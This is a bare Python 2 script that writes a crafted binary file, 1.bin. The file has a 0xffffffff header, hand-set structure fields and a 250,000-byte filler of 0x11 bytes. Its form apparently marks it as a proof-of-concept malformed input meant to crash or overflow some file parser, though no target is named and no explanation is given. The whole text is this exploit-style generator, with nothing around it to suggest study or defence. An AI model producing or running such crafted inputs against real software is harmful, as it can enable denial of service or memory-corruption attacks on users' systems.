#!/usr/bin/env python2

import binascii

s='ff ff ff ff'
s+=' 15 00 00 00 00 00 00 00 01 00 04 00'
s+='01 00 00 00 00 00 00 00 0d 00 00 00 12 00 00 00'
s+='0c 00 00 00 01 00 02 00 20 00 00 00 00 00 03 00'
s+=' 34 00 00 00 00 00 01 00 32 00 00 00 00 00 00 00'
s+=' 05 00 00 00 00 00 00 00 04 00 00 00 01 00 00 00'
s+=' 04 00 00 00 00 00 01 00 03 00 00 00 00 00 00 00'
s+=' 01 00 00 00 12 00 00 00 34 00 00 00 00 00 00 00'
s+=' 08 00 00 00 01 00 00 00 08 00 00 00 00 00 01 00'
s+=' 00 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00'
s+=' 01 00 00 00 12 00 00 00 37 00 00 00 00 00 00 00'
s+=' 01 00 00 00 12 00 00 00 39 00 00 00 00 00 00 00'
s+='1'*500000

s=s.replace(' ','')
file('1.bin','wb').write(binascii.unhexlify(s))
